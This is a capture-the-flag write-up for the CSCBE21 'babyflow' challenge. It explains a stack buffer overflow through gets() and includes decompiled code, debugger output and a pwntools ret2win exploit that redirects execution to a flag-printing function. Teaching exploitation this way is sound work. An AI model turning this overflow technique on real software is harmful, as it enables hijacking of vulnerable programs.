### Introduction

This pwn challenge was part of the qualifiers for CSCBE21. In this writeup I will explain in a beginner friendly way how we can exploit a buffer overflow in order to control the instruction pointer.

### Analysis
We are provided with a binary:
```
┌─[crystal@crystal-virtualbox]─[~/Downloads/CTF-CSCBE/pwn/BOF]
└──╼ $file babyflow
babyflow: ELF 64-bit LSB executable, x86-64, version 1 (SYSV), dynamically linked, interpreter /lib64/ld-linux-x86-64.so.2, BuildID[sha1]=d61066b7c0655ca41f05c8507b7a61575de7dd93, for GNU/Linux 3.2.0, not stripped

┌─[crystal@crystal-virtualbox]─[~/Downloads/CTF-CSCBE/pwn/BOF]
└──╼ $checksec --file=babyflow
[*] '/home/crystal/Downloads/CTF-CSCBE/pwn/BOF/babyflow'
    Arch:     amd64-64-little
    RELRO:    Partial RELRO
    Stack:    No canary found
    NX:       NX enabled
    PIE:      No PIE (0x400000)
```

We can see it's a 64 bit executable which is not stripped. Additionally, checksec shows no stack canary is present and PIE is disabled. NX has been enabled, and RELRO is partially present.

```

└──╼ $./babyflow 
I made this binary so that the flag can never be obtained!
However, you can take a guess if you want!
Enter your guess and hope for the best...
flag123
Better luck next time!
```

Running the binary shows us that we can take a guess at identifying the flag. When given the input `flag123`, the binary outputs `Better luck next time!', indicating that the guess was wrong.


#### main()
```c
undefined8 main(void)

{
  int iVar1;
  undefined8 uVar2;
  char local_58 [32];
  char local_38 [32];
  int local_18;
  char local_11;
  FILE *local_10;
  
  setvbuf(stdout,(char *)0x0,2,0);
  local_10 = fopen("comparison.txt","r");
  if (local_10 == (FILE *)0x0) {
    uVar2 = 1;
  }
  else {
    do {
      iVar1 = fgetc(local_10);
      local_11 = (char)iVar1;
    } while (local_11 != -1);
    fclose(local_10);
    red();
    puts("I made this binary so that the flag can never be obtained!");
    puts("However, you can take a guess if you want!");
    puts("Enter your guess and hope for the best...");
    gets(local_58);
    local_18 = strcmp(local_38,local_58);
    if (local_18 == 0) {
      white();
      puts("Impressive guess! Not good enough tho...");
    }
    else {
      puts("Better luck next time!");
    }
    uVar2 = 0;
  }
  return uVar2;
}
```

Looking at the decompiled code in Ghidra, we can see that the main function is pretty small. First, it reads defines a couple variables. Next, the binary reads a file called `comparison.txt`. Then, the UNSAFE `gets()` function is called, which will handle the user input. The `strcmp()` will compare the user input, to the input of the read file (comparison.txt). If the comparison equals 0 (equal value), the binary will print `Impressive guess! Not good enough tho...`, else it will print `Better luck next time!`.

#### winner()
```c
void winner(void)

{
  system("cat flag.txt");
  return;
}
```

There is also another function, called `winner()`. This function simply calls `system()` from libc, which will then print the `flag.txt`. However, this `winner()` function is never called.

### Explanation

As mentioned earlier, the `gets()` function is unsafe since it doesn't check how large the user input may be. This can lead to a buffer overflow. 

Since NX is enabled, we can not insert our own shellcode onto the stack, but luckily this is not needed. The function `winner()` is present which will print the flag. Therefore we need to get control of RIP (instruction pointer) and point it to `winner()`.

### Exploit

```c
  char local_58 [32];
  ...
  gets(local_58);
```

  The variable where the user input will be stored in, can contain **32 bytes**. With this info, we can calculate what the offset will be between our input, and the return address.

abc123
```
We set a breakpoint right after `gets` (our input), followed by entering a string.

```shell
pwndbg> i f
Stack level 0, frame at 0x7fffffffdf10:
 rip = 0x4012b3 in main; saved rip = 0x7ffff7e0cd0a
 called by frame at 0x7fffffffdfe0
 Arglist at 0x7fffffffdf00, args: 
 Locals at 0x7fffffffdf00, Previous frame's sp is 0x7fffffffdf10
 Saved registers:
  rbp at 0x7fffffffdf00, rip at 0x7fffffffdf08
pwndbg> search --string abc123
[heap]          0x405480 'abc123\ngnhvpkqmagwt'
[stack]         0x7fffffffdeb0 0x333231636261 /* 'abc123' */
```

We can see that RIP (ret address) is set to `0x7fffffffdf08`, while as our entered string is located at `0x7fffffffdeb0`.

Substracting our string address from RIP gives us the buffer size.
`0x7fffffffdf08` - `0x7fffffffdeb0` = `0x58` (or 88 in decimal).

Next, we determine our `winner` function (which prints the flag): 
```shell
pwndbg> p winner
$1 = {<text variable, no debug info>} 0x4011a2 <winner>
```

Now we can fill our buffer with 0x58 bytes which leads to us having control over RIP. Therefore we can set RIP to the winner function.

However, there is one issue when we try to execute this: the `MOVAPS issue`. This is caused on Ubuntu systems when operating with an unaligned stack. We can fix this by adding a `ret` instruction before our winner address. This causes the stack to be aligned.

See [ROP Emporium](https://ropemporium.com/guide.html) for more information about MOVAPS.

Ret instructions can be found using a variety of tools, such  as `ROPgadget`.

```python
from pwn import * 
target = process("./babyflow") # local
#target = remote('ip', port) # remote
context.log_level = 'debug' # enable debug mode (more verbosity)
payload = 0x58 * b'A' # (fill buffer)
payload += p64(0x401192)  # ret instruction to align  the stack
payload += p64(0x4011a2) # winner address
target.sendline(payload) # send full payload
target.interactive()
```
